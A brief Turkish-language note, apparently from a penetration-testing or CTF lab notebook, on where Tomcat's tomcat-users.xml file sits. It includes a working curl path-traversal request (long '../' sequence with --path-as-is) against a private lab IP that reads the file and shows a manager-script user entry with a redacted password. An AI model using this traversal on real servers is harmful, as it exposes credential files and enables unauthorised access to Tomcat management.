#Tomcat 
tomcat-users.xml dosyası nerede olur?

 Mesela opt altında ise tomcat:x:1002:1002::/opt/tomcat:/bin/false

Genel olarak evet, Tomcat’in kullanıcı tanımlarının bulunduğu dosya: /opt/tomcat/conf/tomcat-users.xml dosyasında bulunur 
```bash
curl --path-as-is 'http://10.10.61.142:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml'
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[REDACTED]" roles="manager-script"/>

</tomcat-users>
```
